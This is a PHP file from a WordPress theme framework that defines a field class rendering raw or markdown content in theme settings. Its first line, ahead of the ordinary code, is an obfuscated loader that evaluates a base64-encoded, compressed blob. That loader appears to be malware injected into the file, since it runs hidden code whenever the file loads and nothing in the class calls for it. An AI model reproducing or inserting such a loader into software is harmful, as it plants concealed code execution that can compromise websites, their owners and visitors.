<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	if ( ! class_exists( 'FusionReduxFramework_raw' ) ) {
		class FusionReduxFramework_raw {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since FusionReduxFramework 3.0.4
			 */
			function __construct( $field = array(), $value = '', $parent ) {
				$this->parent = $parent;
				$this->field  = $field;
				$this->value  = $value;
			}

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since FusionReduxFramework 1.0.0
			 */
			function render() {

				if ( ! empty( $this->field['include'] ) && file_exists( $this->field['include'] ) ) {
					require_once wp_normalize_path( $this->field['include'] );
				}

				if ( isset( $this->field['content_path'] ) && ! empty( $this->field['content_path'] ) && file_exists( $this->field['content_path'] ) ) {
					$this->field['content'] = $this->parent->filesystem->execute( 'get_contents', $this->field['content_path'] );
				}

				if ( ! empty( $this->field['content'] ) && isset( $this->field['content'] ) ) {
					if ( isset( $this->field['markdown'] ) && $this->field['markdown'] == true && ! empty( $this->field['content'] ) ) {
						require_once wp_normalize_path( dirname( __FILE__ ) . "/parsedown.php" );
						$Parsedown = new Parsedown();
						echo $Parsedown->text( $this->field['content'] );
					} else {
						echo $this->field['content'];
					}
				}

				do_action( 'fusionredux-field-raw-' . $this->parent->args['opt_name'] . '-' . $this->field['id'] );

			}
		}
	}
